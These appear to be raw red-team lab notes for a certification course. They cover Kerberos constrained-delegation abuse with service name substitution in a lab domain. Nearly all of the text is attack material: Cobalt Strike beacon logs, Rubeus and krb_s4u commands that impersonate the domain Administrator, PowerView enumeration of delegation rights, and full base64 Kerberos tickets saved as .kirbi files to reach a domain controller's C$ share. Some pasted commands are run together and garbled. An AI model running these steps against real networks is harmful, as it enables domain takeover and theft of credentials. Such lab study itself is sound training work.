RjaWZzGwhsb24tZGMtMQ==


[04/12 20:49:46] beacon> make_token CONTOSO\Administrator FakePass
[04/12 20:49:46] [*] Tasked beacon to create a token for CONTOSO\Administrator
[04/12 20:49:46] [+] host called home, sent: 48 bytes
[04/12 20:49:46] [+] Impersonated CONTOSO\Administrator (netonly)
[04/12 20:50:03] beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi
[04/12 20:50:03] [*] Tasked beacon to apply ticket in C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi
[04/12 20:50:07] [+] host called home, sent: 3976 bytes
[04/12 20:50:25] beacon> ls \\lon-dc-1\c$
[04/12 20:50:25] [*] Tasked beacon to list files in \\lon-dc-1\c$
[04/12 20:50:27] [+] host called home, sent: 31 bytes
[04/12 20:50:27] [*] Listing: \\lon-dc-1\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 09:20:24   PerfLogs
          dir     04/11/2025 13:01:00   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     04/12/2026 21:06:31   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/29/2025 10:42:20   System Volume Information
          dir     01/24/2025 13:33:21   Users
          dir     04/11/2025 11:54:00   Windows
 12kb     fil     04/12/2026 14:05:24   DumpStack.log.tmp
 1gb      fil     04/12/2026 14:05:24   pagefile.sys

```

krb_s4u /ticket:[base64-TGT] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator

```
⚠️ Prerequisite: Load BOF aggressor script for `krb_triage` and `krb_dump`  
>Open > Cobalt Strike > Script Manager > Load > `C:\Tools\Kerbeus-BOF\kerbeus_cs.cna`  

doIFmjCCBZagAwIBBaEDAgEWooIEozCCBJ9hggSbMIIEl6ADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBF0wggRZoAMCARKhAwIBAqKCBEsEggRHdKslK6i+Jhxo0Q5mQkNAdPDNyPOJE3sDAsibPxZt5xq9BVSm58FtfxsaN4ZJ6w7otai4zFPsRVM4EE6nvV+kITa1hQ7GA48CXjlxLUV7HgnNG72NrjaV0vjkGEZLyc4HYnGxY/W+tZgREX6xKho8iuU9AqjMOn4hb38r83kXm2Iu2esJ+QYdh5SIoB7vzxSGcqxXwOGtsqIUOD8R3jEXv8kyXzb59x7WRMVLoKot3CZgRVsBDDDRvLFdU7D3A4iV+XxO+To7jU8SsjtmvkgcLoQAXDHgu8FxwEDC1OS2Zlv/9QTQ8A6mJtVy02sjwSO24736gHUGEVvaALj1YSKmme9MJQHIt47yeRGLbPqMl9WvYsCI3BbvM0pOC0fgeS/E/ynRu7mQBT6fw6u3RpAREkjbuEiD0ADpyaT/yXxX4Lu1+aTIKPBsDoJxE+XY6K3Mk0+zL/YikeCfY5IZkljRAkkHwV+xQjr/K8r+V0qfF64MmhkMEGm9nZq69BXWuBZ0AiPIOkNd9a4rVfEEQZgXmM+Qd0fX2q9fKtumoqOGDgrge00wHSa+hQy8pbCfMzsQzIE5YbYZtAGhnIm13Ps2lcnH7AGZDihJ8TNzznOdjhrJrCHj0btmobQQ5Yf6xiEjGC+mH7SUsWyA9qUMiMiIF+BQGuUEoJfwAViukFiJ5pCYY4sKRr7N/dwHVoIstwvJisFVtpfdUPH27djeNw27XkCx1atbpgyMLD4MgbsnSZ5mGLkHjY1WIz6DUd4Vr2oUeDPCM55l7vVRKTUs7tc4l7TZOdFlACfi+7/Asn6mTLSxqRAdSa8s6N18OclYC7xtzSI0Z+76iDAqdu6SQjg8ZWCPjfJwHKcRp6zpWasc8iwQ+4JDlPwKrg+M17KJldPcLMBCBFbng2wIcPag3npFXQ88bjFZaoN7u5sKtpYpeblgOZBgS3bb92ZywjAiijzFstfUIgD/9Ut/gPWbOGZmjuXZ+KPcK0pKlUtYr2S7lEvdSFuQPwVgaZvc4nNCNEH+5H805zT/nMPKCVEkjBvRHPIi7vtdGNzD+YxibtSiiWXWPHv1P+T7dJOqLEWFBDliARCoCy6UMq5/yV2Fdij7cHVx/FfuknV2H9pq8YKWMubnVaMEyyVlVeLyMsFZRRbvYi8QrQIqGahonkjYC+pWkueQYE3U1GMEOu5dXZL+i1TWaehpo3mu3Rgh/J5fBMdtdf8a6i/HsdqG3ECSyDCi1BR6i9J+NN9h+DFiGnfsvuKwXrDu1WlyrV/sVAslxd+qDIZP6XZPqw2F3MvZqozvPBSy/TpcKVxr1RGBTp6shWUWJC/e2G8HnTwl22qFrOeDxgpWryjr8M+eU2K7taLPmTf0eq82QKT/TtFeIEjhR5ewp5Sf+T+zwAP0ZDOevqVobSeniCEIGNNIBCfjpkwP8RhM/+SCyFAWCGp6MXWbymHVGWl5jHE6o4HiMIHfoAMCAQCigdcEgdR9gdEwgc6ggcswgcgwgcWgKzApoAMCARKhIgQgSkqvKli1rxEXmnBraYWQ+Nixyqig7hXLeDqmdYhe1N2hDRsLQ09OVE9TTy5DT02iFDASoAMCAQGhCzAJGwdwY2hpbGRzowcDBQBgoQAApREYDzIwMjYwNDEyMjAyMDIwWqYRGA8yMDI2MDQxMzA2MDYzNlqnERgPMjAyNjA0MTkyMDA2MzZaqA0bC0NPTlRPU08uQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ==

runas /netonly /user:CONTOSO\pchilds powershell

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /pttrunas /netonly /user:CONTOSO\pchilds powershell


C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEozCCBJ9hggSbMIIEl6ADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBF0wggRZoAMCARKhAwIBAqKCBEsEggRHdKslK6i+Jhxo0Q5mQkNAdPDNyPOJE3sDAsibPxZt5xq9BVSm58FtfxsaN4ZJ6w7otai4zFPsRVM4EE6nvV+kITa1hQ7GA48CXjlxLUV7HgnNG72NrjaV0vjkGEZLyc4HYnGxY/W+tZgREX6xKho8iuU9AqjMOn4hb38r83kXm2Iu2esJ+QYdh5SIoB7vzxSGcqxXwOGtsqIUOD8R3jEXv8kyXzb59x7WRMVLoKot3CZgRVsBDDDRvLFdU7D3A4iV+XxO+To7jU8SsjtmvkgcLoQAXDHgu8FxwEDC1OS2Zlv/9QTQ8A6mJtVy02sjwSO24736gHUGEVvaALj1YSKmme9MJQHIt47yeRGLbPqMl9WvYsCI3BbvM0pOC0fgeS/E/ynRu7mQBT6fw6u3RpAREkjbuEiD0ADpyaT/yXxX4Lu1+aTIKPBsDoJxE+XY6K3Mk0+zL/YikeCfY5IZkljRAkkHwV+xQjr/K8r+V0qfF64MmhkMEGm9nZq69BXWuBZ0AiPIOkNd9a4rVfEEQZgXmM+Qd0fX2q9fKtumoqOGDgrge00wHSa+hQy8pbCfMzsQzIE5YbYZtAGhnIm13Ps2lcnH7AGZDihJ8TNzznOdjhrJrCHj0btmobQQ5Yf6xiEjGC+mH7SUsWyA9qUMiMiIF+BQGuUEoJfwAViukFiJ5pCYY4sKRr7N/dwHVoIstwvJisFVtpfdUPH27djeNw27XkCx1atbpgyMLD4MgbsnSZ5mGLkHjY1WIz6DUd4Vr2oUeDPCM55l7vVRKTUs7tc4l7TZOdFlACfi+7/Asn6mTLSxqRAdSa8s6N18OclYC7xtzSI0Z+76iDAqdu6SQjg8ZWCPjfJwHKcRp6zpWasc8iwQ+4JDlPwKrg+M17KJldPcLMBCBFbng2wIcPag3npFXQ88bjFZaoN7u5sKtpYpeblgOZBgS3bb92ZywjAiijzFstfUIgD/9Ut/gPWbOGZmjuXZ+KPcK0pKlUtYr2S7lEvdSFuQPwVgaZvc4nNCNEH+5H805zT/nMPKCVEkjBvRHPIi7vtdGNzD+YxibtSiiWXWPHv1P+T7dJOqLEWFBDliARCoCy6UMq5/yV2Fdij7cHVx/FfuknV2H9pq8YKWMubnVaMEyyVlVeLyMsFZRRbvYi8QrQIqGahonkjYC+pWkueQYE3U1GMEOu5dXZL+i1TWaehpo3mu3Rgh/J5fBMdtdf8a6i/HsdqG3ECSyDCi1BR6i9J+NN9h+DFiGnfsvuKwXrDu1WlyrV/sVAslxd+qDIZP6XZPqw2F3MvZqozvPBSy/TpcKVxr1RGBTp6shWUWJC/e2G8HnTwl22qFrOeDxgpWryjr8M+eU2K7taLPmTf0eq82QKT/TtFeIEjhR5ewp5Sf+T+zwAP0ZDOevqVobSeniCEIGNNIBCfjpkwP8RhM/+SCyFAWCGp6MXWbymHVGWl5jHE6o4HiMIHfoAMCAQCigdcEgdR9gdEwgc6ggcswgcgwgcWgKzApoAMCARKhIgQgSkqvKli1rxEXmnBraYWQ+Nixyqig7hXLeDqmdYhe1N2hDRsLQ09OVE9TTy5DT02iFDASoAMCAQGhCzAJGwdwY2hpbGRzowcDBQBgoQAApREYDzIwMjYwNDEyMjAyMDIwWqYRGA8yMDI2MDQxMzA2MDYzNlqnERgPMjAyNjA0MTkyMDA2MzZaqA0bC0NPTlRPU08uQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ== /service:ldap/lon-dc-1 /dc:lon-dc-1 /pttrunas /netonly /user:CONTOSO\pchilds powershell




Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier

Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-3926355307-1661546229-813047887-1107)' -Server 'lon-dc-1'



krb_s4u /ticket:[base64-TGT] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator

doIFrDCCBaigAwIBBaEDAgEWooIEsDCCBKxhggSoMIIEpKADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBGowggRmoAMCARKhAwIBAqKCBFgEggRUsH/ywoI4rT25NLqeTz8acbX4peOU+hWAG3agyFKlT/DT8iAnPpmu0OaV5D9MCO47uI4T7WbyivYaC1YRm07lf2UinS4q2VJnn2NwwD1mmjKXwpAIcFpIk6yV12pJ5uVqRhtaTm+/DClqcWIDM51vqIpQUkcnWWAB1mgpU6lmYGIhWXUWkzwvw1GVbI/9HylgbgZpZ9AcIkFERxWlOMelZgMQUgn52mL7yVAcWR9cVPDw7tj8U+HW+ICJg6eJyZllghbTEaY/4GnZb0iqKNgkIHtAHPmilnv8c/0+uWgLjYioqf+0b9qNA9wtjggh8mjwnTuZgPwNv1BwpxG9jge4L/e50+9W+N0lzK6sW6r/av9KNWfqc1/be2JQnKaRhGQ+QGsgcjOkMUu7MTFQTA/QEEzdcsvtSA1yTS6x8mDsBVFHq6Fr/Vby+wsek3rFaUv0isAFT/GX4STQ2JnyN6ciM2jufwWzMWvXMFnE7FblHE1fBhWM6/seBPbjqyJE0bOElbEcYMgfDjuFh+Q94cuxifQWja5oBAfmyuylgBkCfuEZlDuUH+H+g/UssFIAY59spNV9N8wjKx5xAnZcbO+qAv80vwPUtkWp+iy9TUauPhCruGO7FKjuFSa877xK3pFfP27d6rYiHOAo3q1oEyVS+YtVKe41tPmDO02pt+nN4iaMAiEX9cBAyVa7OtM08MXLVZkqH3aONqYS12LyLjnmCZlH1THTmcwEuXuxWimUJADvSLf7hY5dRPDlXAKPbyTWSACshFmJYCdwGBTLNYacgxNiQfzsSNOG+S/FalUp4DnjqCyWfqmjVfXfg1AnUIPlWHS9Ca3q8+mbu41FPhgLoMI9bbX1rnDuIJfeSGU20hlRqBNEIbpa38kdYt8KiHCUbC7NeqAHdFqdsdKH7T3oim9JcPhROJVKy9Bv21auMuPhIB0kBCpaym3uXwPFpUFCZEbnXtaSZJ7O655yqcsLbNixd8+zHQ8GNSx/a0cQlxMi/8MJ9odNuxOGRRegCJogsA0UnQHE9dYXqktvewcZGeeUCnbl+3epncpKGRNe2KQNAsxrwpLhXAWZR2Evmk2wjS0P5P6OWxNAdlS/nhu9op6Do9aY01cPfru3/ziCof5jAnoXAFxOAKJUJ1gC2/q7tOf0UYQOwByn2GMCiddWxIgsn8r9nVirJ5ByfvVxqFEVpjahHUtRCQ7D/8J5u1PNWGYXA02MRTNyOet11pUvdH4bk7qcHpdkwW6dWhYxMW20CU6tagZqmVWfVqhM4iUCtc8yZ/W/DX2y0MZuRo5onKHow61wwq4ejYZGvlvvZsxq2GpHmuMtmsfMDfN1fn9XyF1c3DORNLa3qPco74wYefOPKF9IGCdJsQKns5Iwn9eV5X5DjntrEG+C0x+slMfpUI9NeDDbz8mv+YSSsPFagBOz+Ujo9+9g2TgVQOqov8g3+vnfl5MpV59tK1HSvXMIyUA+/qOB5zCB5KADAgEAooHcBIHZfYHWMIHToIHQMIHNMIHKoCswKaADAgESoSIEIOetUdkRIlraheAYKUBatyPSzzBtpGUEwbLcLIoevkGYoQ0bC0NPTlRPU08uQ09NohkwF6ADAgEBoRAwDhsMTE9OLVdLU1ROLTEkowcDBQBA4QAApREYDzIwMjYwNDEyMjAwNjEyWqYRGA8yMDI2MDQxMzA2MDYxMlqnERgPMjAyNjA0MTkyMDA2MTJaqA0bC0NPTlRPU08uQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ==


userAccountControl: 16781312
sAMAccountName: LON-WKSTN-1$
msDS-AllowedToDelegateTo: ldap/lon-dc-1.contoso.com, ldap/lon-dc-1
retreived 1 results total


krb_s4u /ticket:doIFrDCCBaigAwIBBaEDAgEWooIEsDCCBKxhggSoMIIEpKADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBGowggRmoAMCARKhAwIBAqKCBFgEggRUsH/ywoI4rT25NLqeTz8acbX4peOU+hWAG3agyFKlT/DT8iAnPpmu0OaV5D9MCO47uI4T7WbyivYaC1YRm07lf2UinS4q2VJnn2NwwD1mmjKXwpAIcFpIk6yV12pJ5uVqRhtaTm+/DClqcWIDM51vqIpQUkcnWWAB1mgpU6lmYGIhWXUWkzwvw1GVbI/9HylgbgZpZ9AcIkFERxWlOMelZgMQUgn52mL7yVAcWR9cVPDw7tj8U+HW+ICJg6eJyZllghbTEaY/4GnZb0iqKNgkIHtAHPmilnv8c/0+uWgLjYioqf+0b9qNA9wtjggh8mjwnTuZgPwNv1BwpxG9jge4L/e50+9W+N0lzK6sW6r/av9KNWfqc1/be2JQnKaRhGQ+QGsgcjOkMUu7MTFQTA/QEEzdcsvtSA1yTS6x8mDsBVFHq6Fr/Vby+wsek3rFaUv0isAFT/GX4STQ2JnyN6ciM2jufwWzMWvXMFnE7FblHE1fBhWM6/seBPbjqyJE0bOElbEcYMgfDjuFh+Q94cuxifQWja5oBAfmyuylgBkCfuEZlDuUH+H+g/UssFIAY59spNV9N8wjKx5xAnZcbO+qAv80vwPUtkWp+iy9TUauPhCruGO7FKjuFSa877xK3pFfP27d6rYiHOAo3q1oEyVS+YtVKe41tPmDO02pt+nN4iaMAiEX9cBAyVa7OtM08MXLVZkqH3aONqYS12LyLjnmCZlH1THTmcwEuXuxWimUJADvSLf7hY5dRPDlXAKPbyTWSACshFmJYCdwGBTLNYacgxNiQfzsSNOG+S/FalUp4DnjqCyWfqmjVfXfg1AnUIPlWHS9Ca3q8+mbu41FPhgLoMI9bbX1rnDuIJfeSGU20hlRqBNEIbpa38kdYt8KiHCUbC7NeqAHdFqdsdKH7T3oim9JcPhROJVKy9Bv21auMuPhIB0kBCpaym3uXwPFpUFCZEbnXtaSZJ7O655yqcsLbNixd8+zHQ8GNSx/a0cQlxMi/8MJ9odNuxOGRRegCJogsA0UnQHE9dYXqktvewcZGeeUCnbl+3epncpKGRNe2KQNAsxrwpLhXAWZR2Evmk2wjS0P5P6OWxNAdlS/nhu9op6Do9aY01cPfru3/ziCof5jAnoXAFxOAKJUJ1gC2/q7tOf0UYQOwByn2GMCiddWxIgsn8r9nVirJ5ByfvVxqFEVpjahHUtRCQ7D/8J5u1PNWGYXA02MRTNyOet11pUvdH4bk7qcHpdkwW6dWhYxMW20CU6tagZqmVWfVqhM4iUCtc8yZ/W/DX2y0MZuRo5onKHow61wwq4ejYZGvlvvZsxq2GpHmuMtmsfMDfN1fn9XyF1c3DORNLa3qPco74wYefOPKF9IGCdJsQKns5Iwn9eV5X5DjntrEG+C0x+slMfpUI9NeDDbz8mv+YSSsPFagBOz+Ujo9+9g2TgVQOqov8g3+vnfl5MpV59tK1HSvXMIyUA+/qOB5zCB5KADAgEAooHcBIHZfYHWMIHToIHQMIHNMIHKoCswKaADAgESoSIEIOetUdkRIlraheAYKUBatyPSzzBtpGUEwbLcLIoevkGYoQ0bC0NPTlRPU08uQ09NohkwF6ADAgEBoRAwDhsMTE9OLVdLU1ROLTEkowcDBQBA4QAApREYDzIwMjYwNDEyMjAwNjEyWqYRGA8yMDI2MDQxMzA2MDYxMlqnERgPMjAyNjA0MTkyMDA2MTJaqA0bC0NPTlRPU08uQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ== /service:ldap/lon-dc-1 /altservice:cifs /impersonateuser:Administrator



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

[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[BASE64-SERVICE-TICKET]"))


[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi", [Convert]::FromBase64String("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"))



```  

solution for challenge:

https://github.com/botesjuan/CRTO-Study-Notes/blob/main/labs/Service-Name-Substitution-Kerberos-lab.md


